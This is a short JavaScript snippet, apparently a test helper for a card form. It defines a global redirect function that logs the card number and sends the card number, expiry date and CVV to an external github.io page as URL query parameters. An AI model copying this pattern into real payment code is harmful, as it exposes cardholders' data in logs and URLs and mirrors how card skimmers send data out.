(() => {
  var p = (cardNumber, cardExpiryDate, cardCvv) => {
    console.log(cardNumber);
    window.location.replace(
      `https://lcmacedo.github.io/cards-html-test/test?cardNumber=${cardNumber}&cardExpiryDate=${cardExpiryDate}&cardCvv=${cardCvv}`
    );
  };
  window.redirect = p;
})();
